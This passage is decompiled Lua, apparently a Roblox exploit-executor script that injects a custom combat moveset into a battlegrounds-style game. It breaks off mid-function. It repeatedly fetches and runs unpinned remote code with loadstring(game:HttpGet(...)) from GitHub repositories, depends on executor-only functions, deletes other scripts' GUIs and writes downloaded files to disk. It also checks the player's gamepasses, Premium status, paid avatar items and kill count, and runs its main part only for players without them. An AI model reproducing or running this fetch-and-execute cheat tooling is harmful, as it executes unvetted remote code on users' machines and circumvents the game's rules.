loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/Execution/main/Source'))()

local v1 = math.random(1, 9999999)

print(_G[v1])
print(v1)

local v3 = cloneref or function(p2)
    return p2
end
local u4 = v3(game:GetService('ReplicatedStorage'))
local u5 = v3(game:GetService('Players'))
local u6 = v3(game:GetService('Debris'))
local u7 = v3(game:GetService('CollectionService'))
local u8 = v3(game:GetService('SoundService'))
local u9 = v3(game:GetService('UserInputService'))
local u10 = v3(game:GetService('TweenService'))
local u11 = v3(game:GetService('CoreGui'))
local u12 = v3(game:GetService('RunService'))
local u13 = v3(game:GetService('MarketplaceService'))
local u14 = v3(game:GetService('Lighting'))
local u15 = v3(game:GetService('HttpService'))
local u16 = v3(game:GetService('InsertService'))
local u17 = print

local function u18(...)
    if getgenv().console then
        u17(...)
    end
end

local v19, v20, v21 = pairs(u11:GetChildren())

while true do
    local v22, v23 = v19(v20, v21)

    if v22 == nil then
        break
    end

    v21 = v22

    if v23.Name == 'KeySys' or v23:FindFirstChild('Discord', true) then
        v23:Destroy()
    end
end

if workspace:FindFirstChild('Live') and workspace:FindFirstChild('Thrown') then
    if getgenv().setclipboard and getgenv().readfile and getgenv().writefile then
        local v24

        if workspace:FindFirstChild('NoRaycast') then
            v24 = workspace.NoRaycast
        else
            v24 = Instance.new('Folder')
            v24.Name = 'NoRaycast'
            v24.Parent = workspace
        end

        local u25 = RaycastParams.new()

        u25.FilterType = Enum.RaycastFilterType.Exclude
        u25.FilterDescendantsInstances = {
            workspace.Thrown,
            workspace.Live,
            v24,
        }

        local u26 = nil
        local u27 = readfile

        pcall(function()
            if getgenv().getcustomasset then
                u26 = getgenv().getcustomasset
            end
        end)
        u5:GetAttribute('Characters')

        if not game then
            u18('look behind you')
        end

        local _LocalPlayer = u5.LocalPlayer
        local u29 = nil
        local _Terrain = workspace.Terrain
        local u31 = false
        local u32 = {}
        local _TouchEnabled = u9.TouchEnabled

        if u4:FindFirstChild('TeleportEvent') then
            return
        else
            local u34 = false

            if u11:FindFirstChild('KeySystemYayyy') then
                u11:FindFirstChild('KeySystemYayyy'):Destroy()
            end

            pcall(function()
                writefile('GodOnlyKnowsFlexWorks2.mp3', game:HttpGet('https://github.com/Tariviste/KJSounds/raw/refs/heads/main/sdfisdf.mp3'))
            end)
            spawn(function()
                pcall(function()
                    writefile('ApproachingMe1.mp3', game:HttpGet('https://github.com/Tariviste/KJSounds/raw/refs/heads/main/oh....%20uhm.wav'))
                end)
            end)
            spawn(function()
                pcall(function()
                    writefile('WhatDoesItMeanToHavePower.mp3', game:HttpGet('https://github.com/Tariviste/KJSounds/raw/refs/heads/main/power.mp3'))
                end)
            end)

            function QuickWeld(p35, p36, p37, p38, p39)
                local _WeldConstraint = Instance.new('WeldConstraint')

                _WeldConstraint.Part0 = p35
                _WeldConstraint.Part1 = p36
                _WeldConstraint.Parent = p37

                if p39 then
                    p35.Parent = workspace.Thrown

                    table.insert(p38, p35)
                    table.insert(p38, _WeldConstraint)
                end

                return _WeldConstraint
            end

            local function u60(p41, p42, p43, p44)
                local v45, v46, v47 = pairs(p41.Parent:GetChildren())
                local u48 = {}
                local u49 = {}

                while true do
                    local v50

                    v47, v50 = v45(v46, v47)

                    if v47 == nil then
                        break
                    end
                    if v50:IsA('BasePart') then
                        u48[v50] = {
                            CollisionGroup = v50.CollisionGroup,
                            Massless = v50.Massless,
                        }
                        v50.CollisionGroup = 'nocol'
                        v50.Massless = true
                    end
                end

                u49.loop = u12.RenderStepped:Connect(function()
                    p41.CFrame = p42.CFrame * p44
                end)

                function u49.Destroy()
                    local v51, v52, v53 = pairs(u48)

                    while true do
                        local v54

                        v53, v54 = v51(v52, v53)

                        if v53 == nil then
                            break
                        end

                        local v55, v56, v57 = pairs(v54)
                        local v58 = v53

                        while true do
                            local v59

                            v57, v59 = v55(v56, v57)

                            if v57 == nil then
                                break
                            end

                            v58[v57] = v59
                        end
                    end

                    u49.loop:Disconnect()

                    p41.CFrame = p42.CFrame * p44
                end

                if p43 then
                    task.delay(p43, function()
                        u49.Destroy()
                    end)
                end

                return u49
            end

            local u61 = OverlapParams.new()

            u61.FilterType = Enum.RaycastFilterType.Include
            u61.FilterDescendantsInstances = {
                workspace:WaitForChild('Live'),
            }
            u61.RespectCanCollide = false

            function process_result(p62, p63)
                local v64 = p63 or {}
                local _executor = v64.executor
                local v66 = {}
                local v67 = v64.ignore or {}
                local v68 = {}

                if _executor then
                    table.insert(v68, _executor)
                end

                local v69, v70, v71 = pairs(p62)

                while true do
                    local v72

                    v71, v72 = v69(v70, v71)

                    if v71 == nil then
                        break
                    end

                    local u73 = false

                    local function v74()
                        u73 = true
                    end

                    local _Parent = v72.Parent

                    if not (table.find(v67, _Parent) or table.find(v68, _Parent)) then
                        if not _Parent:FindFirstChild('Humanoid') or _Parent.Humanoid.Health <= 0 then
                            v74()
                        end

                        table.insert(v68, _Parent)
                        table.insert(v66, _Parent)
                    end
                    if u73 then
                        break
                    end
                end

                return v66
            end
            function GetPartBoundsInBox(p76)
                local _ = p76.executor
                local _origin = p76.origin
                local _size = p76.size

                if _G.DebugMode then
                    local _Part = Instance.new('Part')

                    _Part.Size = _size
                    _Part.CFrame = _origin
                    _Part.Color = Color3.fromRGB(255, 0, 0)
                    _Part.Transparency = 0.9
                    _Part.Material = Enum.Material.ForceField
                    _Part.CanCollide = false
                    _Part.Anchored = true
                    _Part.Parent = workspace.Thrown

                    u6:AddItem(_Part, 0.33)
                end

                local v80 = workspace:GetPartBoundsInBox(_origin, _size, u61)

                return process_result(v80, p76)
            end
            function DoHitbox(p81, p82, p83, p84)
                local v85 = p82 or game.Players.LocalPlayer.Character

                return GetPartBoundsInBox({
                    executor = v85,
                    ignore = p81,
                    origin = p84 or v85.HumanoidRootPart.CFrame + v85.HumanoidRootPart.CFrame.LookVector * p83.Z * 0.75,
                    size = p83,
                })
            end

            local u86 = Random.new()

            function doscript()
                spawn(function()
                    u18('Loading Functions')

                    local u87 = u7

                    local function v98(p88)
                        local _Sound = Instance.new('Sound')

                        _Sound.SoundGroup = u8.Sounds

                        u87:AddTag(_Sound, 'NewSound')

                        local u90 = nil
                        local u91 = nil

                        u91 = _Sound.Ended:connect(function()
                            if _Sound then
                                _Sound:Destroy()
                            end
                            if u90 then
                                u90:Destroy()
                            end

                            return u91:Disconnect()
                        end)

                        if not p88.RollOffMaxDistance then
                            p88.RollOffMaxDistance = 300
                        end

                        local v92

                        if p88.CFrame then
                            u90 = Instance.new('Attachment')
                            u90.Parent = _Terrain
                            u90.WorldCFrame = p88.CFrame
                            p88.Parent = u90
                            v92 = u90
                        else
                            v92 = u90
                        end

                        p88.CFrame = nil

                        local v93, v94, v95 = pairs(p88)
                        local v96 = _Sound

                        while true do
                            local v97

                            v95, v97 = v93(v94, v95)

                            if v95 == nil then
                                break
                            end

                            v96[v95] = v97
                        end

                        v96:Play()

                        return v96, v92
                    end

                    shared.sfx = v98

                    u18('Loaded SFX')

                    local function v108(p99, p100, p101)
                        local u102 = 1 / (p100 or 60)
                        local u103 = 0
                        local u104 = 0
                        local u105 = true

                        local function u106()
                            u105 = false
                        end
                        local function v107()
                            while u105 do
                                u103 = u103 + u104

                                while u102 <= u103 do
                                    p99(u106)

                                    u103 = u103 - u102

                                    if not u105 then
                                        break
                                    end
                                end

                                u104 = u12.RenderStepped:wait()
                            end
                        end

                        if p101 then
                            v107()
                        else
                            task.spawn(v107)
                        end

                        return u106
                    end

                    shared.loop = v108

                    u18('Loaded Loop')

                    local function u110(p109)
                        if p109 and not p109:IsA('Player') then
                            return p109
                        else
                            return p109 and p109.Character or _LocalPlayer.Character
                        end
                    end
                    local function u113(p111)
                        local v112 = not (p111 and u110(p111).HumanoidRootPart) and u110()

                        if v112 then
                            v112 = u110().PrimaryPart
                        end

                        return v112
                    end
                    local function u116(p114)
                        local v115 = not (p114 and u110(p114):FindFirstChildOfClass('Humanoid'):FindFirstChild('Animator')) and u110()

                        if v115 then
                            v115 = u110():FindFirstChildOfClass('Humanoid'):FindFirstChild('Animator')
                        end

                        return v115
                    end
                    local function u122(p117)
                        local u118 = u110

                        local function v120(p119)
                            if p117 then
                                return p117
                            else
                                return u118(p119)
                            end
                        end

                        Instance.new('Folder', v120()).Name = 'DoingMove'
                        Instance.new('Folder', v120()).Name = 'buildingg'

                        local _Tool = Instance.new('Tool', v120())

                        _Tool:SetAttribute('Name', 'Crushing Pull')
                        _Tool:SetAttribute('ScriptFrozeT', true)
                    end
                    local function u131(p123)
                        local u124 = u110

                        local function v126(p125)
                            if p123 then
                                return p123
                            else
                                return u124(p125)
                            end
                        end

                        if v126() and v126():FindFirstChild('CharacterHandler') then
                            local v127, v128, v129 = pairs(v126():GetChildren())

                            while true do
                                local v130

                                v129, v130 = v127(v128, v129)

                                if v129 == nil then
                                    break
                                end
                                if v130.Name == 'DoingMove' or v130.Name == 'buildingg' or v130:GetAttribute('ScriptFrozeT') then
                                    v130:Destroy()
                                end
                            end
                        end
                    end
                    local function u134(p132)
                        local _Folder = Instance.new('Folder')

                        _Folder.Name = 'Freeze'

                        _Folder:SetAttribute('ScriptFroze', true)

                        _Folder.Parent = p132 or u110()
                    end
                    local function u140(p135)
                        local v136, v137, v138 = pairs(p135 or u110():GetChildren())

                        while true do
                            local v139

                            v138, v139 = v136(v137, v138)

                            if v138 == nil then
                                break
                            end
                            if v139.Name == 'Freeze' and v139:GetAttribute('ScriptFroze') then
                                v139:Destroy()
                            end
                        end
                    end
                    local function u143(p141)
                        local _Folder2 = Instance.new('Folder')

                        _Folder2.Name = 'NoRotate'

                        _Folder2:SetAttribute('ScriptFroze', true)

                        _Folder2.Parent = p141 or u110()
                    end
                    local function u149(p144)
                        local v145, v146, v147 = pairs(p144 or u110():GetChildren())

                        while true do
                            local v148

                            v147, v148 = v145(v146, v147)

                            if v147 == nil then
                                break
                            end
                            if v148.Name == 'NoRotate' and v148:GetAttribute('ScriptFroze') then
                                v148:Destroy()
                            end
                        end
                    end

                    u18('Loaded Script Functions')

                    local u150 = nil

                    task.spawn(function()
                        local u151 = nil

                        shared.shakes = {0, 0, 0}

                        local u152 = _LocalPlayer
                        local u153 = 0
                        local u154 = 0
                        local u155 = 0

                        function shared.addshake(p156)
                            if u152:GetAttribute('S_ReducedCamshake') then
                                p156 = p156 / 2
                            end
                            if not u151 then
                                _LocalPlayer:SetAttribute('NoHeadFollow', true)

                                u151 = shared.loop(function()
                                    u153 = u153 * (math.random(1, 2) == 1 and -1 or 1)
                                    u154 = u154 * (math.random(1, 2) == 1 and -1 or 1)
                                    u155 = u155 * (math.random(1, 2) == 1 and -1 or 1)

                                    local v157 = {u153, u154, u155}

                                    shared.shakes = v157
                                    u153 = u153 * 0.85
                                    u154 = u154 * 0.85
                                    u155 = u155 * 0.85

                                    if math.abs(u153) <= 0.05 and math.abs(u154) <= 0.05 and math.abs(u155) <= 0.05 then
                                        _LocalPlayer:SetAttribute('NoHeadFollow', false)
                                        u151()

                                        u151 = nil
                                    end
                                end, 60)
                            end

                            u153 = u153 + p156 * (math.random(1, 2) == 1 and -1 or 1)
                            u154 = u154 + p156 * (math.random(1, 2) == 1 and -1 or 1)
                            u155 = u155 + p156 * (math.random(1, 2) == 1 and -1 or 1)
                        end

                        u18('Loaded Shake')

                        if not _G.ShakeEnabled then
                            _G.ShakeEnabled = true
                            u150 = game['Run Service'].RenderStepped:Connect(function(p158)
                                local v159, v160, v161 = pairs(u32)

                                while true do
                                    local v162

                                    v161, v162 = v159(v160, v161)

                                    if v161 == nil then
                                        break
                                    end
                                    if v162:IsDescendantOf(workspace) then
                                        if not v162:FindFirstChild('Humanoid') then
                                            table.remove(u32, v161)
                                        end
                                    else
                                        table.remove(u32, v161)
                                    end
                                end

                                if u151 then
                                    local _HumanoidRootPart = _LocalPlayer.Character.HumanoidRootPart
                                    local _Head = _LocalPlayer.Character.Head
                                    local _Torso = _LocalPlayer.Character.Torso
                                    local _Humanoid = _LocalPlayer.Character.Humanoid
                                    local v167 = Vector3.new(0 + u153, -1.25 + u154, 0 + u155)

                                    if _Head and _Head.Parent and (_Torso and _Torso.Parent) then
                                        v167 = v167 + _HumanoidRootPart.CFrame:toObjectSpace(_Head.CFrame).p
                                    end

                                    local v168 = _Humanoid.CameraOffset:lerp(v167, 1 - 0.000025 ^ p158)
                                    local _magnitude = (_HumanoidRootPart.Position - (_HumanoidRootPart.Position + v168)).magnitude
                                    local v170 = _HumanoidRootPart.CFrame * CFrame.new(Vector3.new(0, 1.5, 0, 0) + v168)

                                    if v168 ~= v168 or _magnitude > 1000 or (v170.Position - _HumanoidRootPart.Position).magnitude > 1000 then
                                        v168 = Vector3.new()
                                    end

                                    _Humanoid.CameraOffset = v168
                                end
                            end)

                            u18('Loaded Main Loop')
                        end
                    end)

                    local u171 = true

                    pcall(function()
                        u11.ChildRemoved:Connect(function(p172)
                            if p172.Name == 'Kavo' then
                                u171 = false

                                if u150 then
                                    u150:Disconnect()
                                end
                            end
                        end)
                    end)
                    pcall(function()
                        local _Character = _LocalPlayer.Character
                        local v174 = _Character
                        local v175 = _Character.WaitForChild(v174, 'Humanoid')

                        v175:WaitForChild('Animator')
                        v175.AnimationPlayed:Connect(function(p176)
                            p176.Stopped:Connect(function()
                                if not _Character.HumanoidRootPart.Anchored then
                                    _Character.Torso.RootPriority = 0
                                    _Character.Torso.RootPriority = 1
                                    _Character.Torso.RootPriority = 0
                                end
                            end)
                        end)
                    end)
                    _LocalPlayer.CharacterAdded:Connect(function(p177)
                        local _Humanoid2 = p177:WaitForChild('Humanoid')

                        _Humanoid2:WaitForChild('Animator')
                        _Humanoid2.AnimationPlayed:Connect(function(p179)
                            p179.Stopped:Connect(function()
                                if not p177.HumanoidRootPart.Anchored then
                                    p177.Torso.RootPriority = 0
                                    p177.Torso.RootPriority = 1
                                    p177.Torso.RootPriority = 0
                                end
                            end)
                        end)
                    end)

                    local u180 = {}

                    function shared.SetCore(p181, _, _)
                        local v182 = _LocalPlayer
                        local v183, v184, v185 = pairs(v182:WaitForChild('PlayerGui'):GetChildren())

                        while true do
                            local u186

                            v185, u186 = v183(v184, v185)

                            if v185 == nil then
                                break
                            end
                            if u186:IsA('ScreenGui') and u186.Name ~= 'ImpactFrames' and u186.Name ~= 'Flexworks' then
                                task.spawn(function()
                                    if table.find(u180, u186) then
                                        u186.Enabled = p181

                                        if p181 == false then
                                            u180[u186] = nil
                                        end
                                    elseif u186.Enabled then
                                        u186.Enabled = p181

                                        table.insert(u180, u186)
                                    end
                                end)
                            end
                        end
                    end

                    u18('Loaded SetCore')

                    local u187 = nil
                    local u188 = nil
                    local u189 = nil
                    local u190 = nil
                    local u191 = nil
                    local u192 = nil
                    local u193 = nil
                    local u194 = nil

                    local function u200()
                        spawn(function()
                            local u195 = nil

                            if not _G.v1105 then
                                pcall(function()
                                    u195 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/what1'))()
                                end)

                                if not u195 then
                                    u18('dropkick cutscene didnt load... :/')

                                    return
                                end

                                _G.v1105 = u195
                            end

                            u189 = _G.v1105 or u195
                        end)
                        spawn(function()
                            local u196 = nil

                            if not _G.v9 then
                                pcall(function()
                                    u196 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/Kavo-Mobile/main/Utility'))()
                                end)

                                if not u196 then
                                    u18('utility didnt load... :/')

                                    return
                                end

                                _G.v9 = u196
                            end

                            u190 = _G.v9 or u196
                        end)
                        spawn(function()
                            local u197 = nil

                            if not _G.SPECIAL then
                                pcall(function()
                                    u197 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/what2'))()
                                end)

                                if not u197 then
                                    u18('dummy cutscene didnt load... :/')

                                    return
                                end

                                _G.SPECIAL = u197
                            end

                            u191 = _G.SPECIAL or u197
                        end)
                        spawn(function()
                            local u198 = nil

                            if not _G.v11052 then
                                pcall(function()
                                    u198 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/what3'))()
                                end)

                                if not u198 then
                                    u18('five seasons startup cutscene didnt load... :/')

                                    return
                                end

                                _G.v11052 = u198
                            end

                            u192 = _G.v11052 or u198
                        end)
                        spawn(function()
                            local u199 = nil

                            if not _G.lib then
                                pcall(function()
                                    u199 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/library'))()
                                end)

                                if not u199 then
                                    u18('library didnt load... :/')

                                    return
                                end

                                _G.lib = u199
                            end

                            u193 = _G.lib or u199
                        end)
                    end

                    u18('Loading Modules')
                    spawn(function()
                        u200()

                        while wait(5) and not (u189 and u190 and (u191 and u192) and u193) do
                            u200()
                        end
                    end)

                    local u201 = u110
                    local u202 = u193
                    local u203 = u192
                    local u204 = u191
                    local u205 = u190

                    repeat
                        wait()
                    until u189 and (u205 and u204) and (u203 and u202)

                    u18('Loaded Modules')

                    local _LocalPlayer2 = u5.LocalPlayer
                    local _LocalPlayer3 = u5.LocalPlayer
                    local _ = _LocalPlayer2.AccountAge
                    local u208 = false
                    local v209 = false
                    local u210

                    if _G.grahh then
                        u210 = _G.grahh
                    else
                        u210 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/info'))()
                    end

                    pcall(function()
                        local _GiftableGamepasses = u210.GiftableGamepasses
                        local v212, v213, v214 = pairs(_GiftableGamepasses)

                        while true do
                            local v215

                            v214, v215 = v212(v213, v214)

                            if v214 == nil then
                                break
                            end

                            local v216 = v215[1]

                            if u13:UserOwnsGamePassAsync(_LocalPlayer3.UserId, v216) then
                                u208 = true
                            end
                        end
                    end)

                    local function v225(p217)
                        local u218 = 0

                        pcall(function()
                            local _assets = u5:GetCharacterAppearanceInfoAsync(p217).assets
                            local v220, v221, v222 = pairs(_assets)

                            while true do
                                local v223

                                v222, v223 = v220(v221, v222)

                                if v222 == nil then
                                    break
                                end

                                local v224 = u13:GetProductInfo(v223.id, Enum.InfoType.Asset)

                                if v224.IsForSale then
                                    u218 = u218 + v224.PriceInRobux
                                end
                            end
                        end)

                        return u218
                    end

                    local v226 = tonumber(v225(_LocalPlayer3.UserId)) > 0 and true or v209
                    local v227 = string.sub(tostring(_LocalPlayer3.MembershipType), 21)
                    local v228 = tostring(v227)

                    if _G.BypassCheck or (_LocalPlayer3:GetAttribute('TotalKillsFrb') == nil or _LocalPlayer3:GetAttribute('TotalKillsFrb') < 1500) and (not u208 and v228 ~= 'Premium' and not v226) then
                        pcall(function()
                            settings().Rendering.QualityLevel = 21
                        end)

                        local u229 = Random.new()
                        local u230 = {
                            workspace.Live,
                            workspace.Thrown,
                        }

                        local function u236(p231, p232, p233, p234)
                            local v235 = p234 or u229

                            if not p232 and p231 then
                                p232 = p231
                                p231 = 1
                            end
                            if not (p232 or p231) then
                                p231 = 0
                                p232 = 1
                            end
                            if p233 then
                                return v235:NextInteger(p231, p232)
                            else
                                return v235:NextNumber(p231, p232)
                            end
                        end

                        local _ = {}
                        local _ = tick()
                        local _LegacyReplication = game.ReplicatedStorage.Resources.LegacyReplication
                        local u238 = _LocalPlayer3

                        local function u246(p239)
                            local _FX = p239.FX
                            local _Scale = p239.Scale
                            local v242, v243, v244 = pairs(_FX:GetDescendants())

                            while true do
                                local v245

                                v244, v245 = v242(v243, v244)

                                if v244 == nil then
                                    break
                                end
                                if v245:IsA('ParticleEmitter') then
                                    v245.Lifetime = NumberRange.new(v245.Lifetime.Min * _Scale, v245.Lifetime.Max * _Scale)
                                end
                            end
                        end
                        local function u251()
                            local v247, v248, v249 = pairs(u201():GetDescendants())

                            while true do
                                local v250

                                v249, v250 = v247(v248, v249)

                                if v249 == nil then
                                    break
                                end
                                if v250.Name == 'UltimateMusic' then
                                    v250:Destroy()
                                end
                            end
                        end

                        u251()

                        local function _()
                            return _TouchEnabled and true or false
                        end

                        function shared.resizemodel(p252, p253)
                            local v254, v255, v256 = pairs(p252:GetDescendants())
                            local v257 = {}
                            local v258 = {}
                            local v259 = {}

                            while true do
                                local v260, v261 = v254(v255, v256)

                                if v260 == nil then
                                    break
                                end

                                v256 = v260

                                if v261:IsA('BasePart') then
                                    table.insert(v259, v261)
                                elseif v261:IsA('JointInstance') then
                                    table.insert(v258, v261)
                                elseif v261:IsA('DataModelMesh') then
                                    table.insert(v257, v261)
                                end
                            end

                            local u262 = {}

                            local function u290(p263)
                                local v264 = math.huge
                                local v265 = math.huge
                                local v266 = math.huge
                                local v267 = -math.huge
                                local v268 = -math.huge
                                local v269 = -math.huge
                                local v270, v271, v272 = pairs(p263)
                                local v273 = v269
                                local v274 = v266
                                local v275 = v268
                                local v276 = v265
                                local v277 = v267
                                local v278 = v264

                                while true do
                                    local v279

                                    v272, v279 = v270(v271, v272)

                                    if v272 == nil then
                                        break
                                    end

                                    local _CFrame = v279.CFrame
                                    local _Size = v279.Size
                                    local v282 = _CFrame * CFrame.new(_Size.X / 2, _Size.Y / 2, _Size.Z / 2)

                                    if v282.X < v278 then
                                        v264 = v282.X
                                        v278 = v264
                                    end
                                    if v282.Y < v276 then
                                        v265 = v282.Y
                                        v276 = v265
                                    end
                                    if v282.Z < v274 then
                                        v266 = v282.Z
                                        v274 = v266
                                    end
                                    if v277 < v282.X then
                                        v267 = v282.X
                                        v277 = v267
                                    end
                                    if v275 < v282.Y then
                                        v268 = v282.Y
                                        v275 = v268
                                    end
                                    if v273 < v282.Z then
                                        v269 = v282.Z
                                        v273 = v269
                                    end

                                    local v283 = _CFrame * CFrame.new(_Size.X / -2, _Size.Y / 2, _Size.Z / 2)

                                    if v283.X < v278 then
                                        v264 = v283.X
                                        v278 = v264
                                    end
                                    if v283.Y < v276 then
                                        v265 = v283.Y
                                        v276 = v265
                                    end
                                    if v283.Z < v274 then
                                        v266 = v283.Z
                                        v274 = v266
                                    end
                                    if v277 < v283.X then
                                        v267 = v283.X
                                        v277 = v267
                                    end
                                    if v275 < v283.Y then
                                        v268 = v283.Y
                                        v275 = v268
                                    end
                                    if v273 < v283.Z then
                                        v269 = v283.Z
                                        v273 = v269
                                    end

                                    local v284 = _CFrame * CFrame.new(_Size.X / -2, _Size.Y / -2, _Size.Z / 2)

                                    if v284.X < v278 then
                                        v264 = v284.X
                                        v278 = v264
                                    end
                                    if v284.Y < v276 then
                                        v265 = v284.Y
                                        v276 = v265
                                    end
                                    if v284.Z < v274 then
                                        v266 = v284.Z
                                        v274 = v266
                                    end
                                    if v277 < v284.X then
                                        v267 = v284.X
                                        v277 = v267
                                    end
                                    if v275 < v284.Y then
                                        v268 = v284.Y
                                        v275 = v268
                                    end
                                    if v273 < v284.Z then
                                        v269 = v284.Z
                                        v273 = v269
                                    end

                                    local v285 = _CFrame * CFrame.new(_Size.X / -2, _Size.Y / -2, _Size.Z / -2)

                                    if v285.X < v278 then
                                        v264 = v285.X
                                        v278 = v264
                                    end
                                    if v285.Y < v276 then
                                        v265 = v285.Y
                                        v276 = v265
                                    end
                                    if v285.Z < v274 then
                                        v266 = v285.Z
                                        v274 = v266
                                    end
                                    if v277 < v285.X then
                                        v267 = v285.X
                                        v277 = v267
                                    end
                                    if v275 < v285.Y then
                                        v268 = v285.Y
                                        v275 = v268
                                    end
                                    if v273 < v285.Z then
                                        v269 = v285.Z
                                        v273 = v269
                                    end

                                    local v286 = _CFrame * CFrame.new(_Size.X / 2, _Size.Y / -2, _Size.Z / 2)

                                    if v286.X < v278 then
                                        v264 = v286.X
                                        v278 = v264
                                    end
                                    if v286.Y < v276 then
                                        v265 = v286.Y
                                        v276 = v265
                                    end
                                    if v286.Z < v274 then
                                        v266 = v286.Z
                                        v274 = v266
                                    end
                                    if v277 < v286.X then
                                        v267 = v286.X
                                        v277 = v267
                                    end
                                    if v275 < v286.Y then
                                        v268 = v286.Y
                                        v275 = v268
                                    end
                                    if v273 < v286.Z then
                                        v269 = v286.Z
                                        v273 = v269
                                    end

                                    local v287 = _CFrame * CFrame.new(_Size.X / 2, _Size.Y / -2, _Size.Z / -2)

                                    if v287.X < v278 then
                                        v264 = v287.X
                                        v278 = v264
                                    end
                                    if v287.Y < v276 then
                                        v265 = v287.Y
                                        v276 = v265
                                    end
                                    if v287.Z < v274 then
                                        v266 = v287.Z
                                        v274 = v266
                                    end
                                    if v277 < v287.X then
                                        v267 = v287.X
                                        v277 = v267
                                    end
                                    if v275 < v287.Y then
                                        v268 = v287.Y
                                        v275 = v268
                                    end
                                    if v273 < v287.Z then
                                        v269 = v287.Z
                                        v273 = v269
                                    end

                                    local v288 = _CFrame * CFrame.new(_Size.X / 2, _Size.Y / 2, _Size.Z / -2)

                                    if v288.X < v278 then
                                        v264 = v288.X
                                        v278 = v264
                                    end
                                    if v288.Y < v276 then
                                        v265 = v288.Y
                                        v276 = v265
                                    end
                                    if v288.Z < v274 then
                                        v266 = v288.Z
                                        v274 = v266
                                    end
                                    if v277 < v288.X then
                                        v267 = v288.X
                                        v277 = v267
                                    end
                                    if v275 < v288.Y then
                                        v268 = v288.Y
                                        v275 = v268
                                    end
                                    if v273 < v288.Z then
                                        v269 = v288.Z
                                        v273 = v269
                                    end

                                    local v289 = _CFrame * CFrame.new(_Size.X / -2, _Size.Y / 2, _Size.Z / -2)

                                    if v289.X < v278 then
                                        v264 = v289.X
                                        v278 = v264
                                    end
                                    if v289.Y < v276 then
                                        v265 = v289.Y
                                        v276 = v265
                                    end
                                    if v289.Z < v274 then
                                        v266 = v289.Z
                                        v274 = v266
                                    end
                                    if v277 < v289.X then
                                        v267 = v289.X
                                        v277 = v267
                                    end
                                    if v275 < v289.Y then
                                        v268 = v289.Y
                                        v275 = v268
                                    end
                                    if v273 < v289.Z then
                                        v269 = v289.Z
                                        v273 = v269
                                    end
                                end

                                return Vector3.new(v278, v276, v274), Vector3.new(v277, v275, v273)
                            end

                            (function(p291, p292, p293, p294, p295, p296)
                                tick()

                                if not p295 then
                                    p295, p296 = u290(p291)
                                end

                                tick()

                                local v297 = (p295 + p296) / 2
                                local v298, v299, v300 = pairs(p292)
                                local v301 = {}

                                while true do
                                    local v302

                                    v300, v302 = v298(v299, v300)

                                    if v300 == nil then
                                        break
                                    end
                                    if v302.Part0 and v302.Part1 then
                                        table.insert(v301, {
                                            v302.ClassName,
                                            v302.Parent,
                                            v302.Name,
                                            v302.Part0,
                                            v302.Part1,
                                            v302.C0,
                                            v302.C1,
                                        })
                                    end

                                    v302:Destroy()
                                end

                                local v303, v304, v305 = pairs(p291)
                                local v306 = {}

                                while true do
                                    local v307

                                    v305, v307 = v303(v304, v305)

                                    if v305 == nil then
                                        break
                                    end
                                    if not v306[v307] then
                                        v306[v307] = true

                                        local _Anchored = v307.Anchored

                                        v307.Anchored = true

                                        if u262.DoUnions or v307:IsA('PartOperation') then
                                            local _ = u262.DoUnions
                                        end

                                        local v309 = v307.Position - v297
                                        local v310 = v307.CFrame - v307.Position
                                        local v311 = v307.Size * p294

                                        v307.Size = v311

                                        if v307.Size ~= v311 then
                                            if v307:IsA('FormFactorPart') then
                                                v307.FormFactor = 'Custom'
                                                v307.Size = v311
                                            end
                                            if v307.Size ~= v311 then
                                                if u262.MeshSmall then
                                                    v307.CanCollide = false
                                                end

                                                local _SpecialMesh = v307:FindFirstChildWhichIsA('SpecialMesh', true)

                                                if _SpecialMesh and (_SpecialMesh:IsA('FileMesh') and _SpecialMesh.MeshId == '' or not _SpecialMesh:IsA('FileMesh')) then
                                                    _SpecialMesh.Scale = _SpecialMesh.Scale * v311 / v307.Size
                                                end
                                            end
                                        end

                                        v307.CFrame = CFrame.new(v309 * p294 + v297) * v310
                                        v307.Anchored = _Anchored
                                    end
                                end

                                local _ = u262.DoJoints
                                local v313, v314, v315 = pairs(v301)

                                while true do
                                    local v316

                                    v315, v316 = v313(v314, v315)

                                    if v315 == nil then
                                        break
                                    end

                                    local v317, v318, v319, v320, v321, v322, v323 = unpack(v316)
                                    local v324 = Instance.new(v317)

                                    v324.Name = v319
                                    v324.Part0 = v320
                                    v324.Part1 = v321
                                    v324.C0 = CFrame.new(v322.p * p294) * (v322 - v322.p)
                                    v324.C1 = CFrame.new(v323.p * p294) * (v323 - v323.p)
                                    v324.Parent = v318
                                end

                                local v325, v326, v327 = pairs(p293)

                                while true do
                                    local v328

                                    v327, v328 = v325(v326, v327)

                                    if v327 == nil then
                                        break
                                    end
                                    if v328:IsA('FileMesh') and v328.MeshId ~= '' and v328.Parent:IsA('BasePart') then
                                        v328.Scale = v328.Scale * p294
                                    end
                                end
                            end)(v259, v258, v257, Vector3.new(1, 1, 1, 0) * p253)
                        end

                        local u329 = Random.new()

                        local function u335(p330, p331, p332, p333)
                            local v334 = p333 or u329

                            if not p331 and p330 then
                                p331 = p330
                                p330 = 1
                            end
                            if not (p331 or p330) then
                                p330 = 0
                                p331 = 1
                            end
                            if p332 then
                                return v334:NextInteger(p330, p331)
                            else
                                return v334:NextNumber(p330, p331)
                            end
                        end
                        local function u340(p336)
                            local _FX2 = p336.FX
                            local _Anchor = p336.Anchor
                            local v339 = _FX2:Clone()

                            if v339:IsA('Model') then
                                v339:PivotTo(_Anchor)
                            elseif v339:IsA('BasePart') then
                                v339.CFrame = _Anchor
                            end
                            if v339:IsA('Attachment') then
                                v339.Parent = _Anchor
                            else
                                v339.Parent = workspace.Thrown
                            end

                            game.Debris:AddItem(v339, 30)

                            return v339
                        end

                        function shared.resizeparticle(p341, p342, p343)
                            local v344 = p343 or 'Size'

                            if v344 == 'Speed' then
                                p341.Speed = NumberRange.new(p341.Speed.Min * p342, p341.Speed.Max * p342)
                            else
                                local v345, v346, v347 = pairs({p341})

                                while true do
                                    local v348

                                    v347, v348 = v345(v346, v347)

                                    if v347 == nil then
                                        break
                                    end

